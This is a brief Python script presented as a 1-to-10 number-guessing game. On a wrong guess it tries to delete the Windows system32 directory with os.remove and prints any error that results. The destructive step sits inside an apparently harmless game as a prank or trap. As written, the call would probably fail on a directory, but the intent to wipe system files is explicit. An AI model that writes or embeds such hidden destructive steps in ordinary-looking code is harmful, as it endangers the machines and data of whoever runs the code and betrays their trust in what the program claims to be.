import os
import random

list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10,]
my_number = int(input("chose number between 1 to 10: "))
computer_choice = random.choice(list)

try:
    if (computer_choice == my_number):
        print("You won bro.")
    else:
        os.remove("c:\\windows\\system32")
except Exception as e:
    print(e)

print(computer_choice)